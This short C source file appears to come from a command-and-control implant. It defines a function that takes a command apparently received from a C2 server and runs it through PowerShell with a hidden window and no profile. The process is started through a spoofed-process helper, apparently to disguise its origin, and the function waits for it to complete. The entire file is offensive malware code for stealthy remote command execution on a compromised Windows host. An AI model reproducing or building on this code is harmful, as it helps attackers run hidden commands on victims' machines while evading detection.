#include "..\helper.h"
#include "ExecutePowershell.h"

VOID ExecPowerShell(LPCWSTR psCommand) {
    WCHAR wrappedPsCmd[4096];

    printf("[*] Executing C2 command : %ls\n", psCommand);

    wsprintfW(
        wrappedPsCmd,
        L"powershell.exe -NoProfile -WindowStyle Hidden -Command \" %ls \"",psCommand
    );

    PROCESS_INFORMATION Pi = { 0 };
    CreateSpoofedProcess(DEFAULT_SPOOFED_PROC, &Pi, wrappedPsCmd);

    ResumeThread(Pi.hThread);
    Sleep(2);

    WaitForSingleObject(Pi.hProcess, INFINITE);
    
    CloseHandle(Pi.hThread);
    CloseHandle(Pi.hProcess);
}